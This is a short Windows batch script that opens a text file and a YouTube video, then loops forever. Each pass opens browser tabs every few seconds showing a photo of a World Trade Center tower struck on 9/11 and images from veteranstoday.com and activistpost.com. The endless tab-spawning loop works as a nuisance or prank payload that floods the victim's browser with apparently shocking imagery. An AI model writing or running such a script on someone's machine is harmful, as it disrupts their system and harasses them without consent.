@echo off
start note.txt
PING localhost -n 10 -w 60000 >NUL
start https://www.youtube.com/watch?v=IcjWJ9t2Yag

:image
start https://upload.wikimedia.org/wikipedia/commons/e/e5/North_face_south_tower_after_plane_strike_9-11.jpg
PING localhost -n 3 -w 60000 >NUL
start http://www.veteranstoday.com/wp-content/themes/_stylebook/timthumb.php?src=http%3A%2F%2Fwww.veteranstoday.com%2Fwp-content%2Fuploads%2F2016%2F04%2F13930618000816_PhotoI.jpg&q=90&w=795&h=470&zc=1
PING localhost -n 3 -w 60000 >NUL
start http://www.activistpost.com/wp-content/uploads/2016/02/twitpic-35.jpg
PING localhost -n 3 -w 60000 >NUL
goto image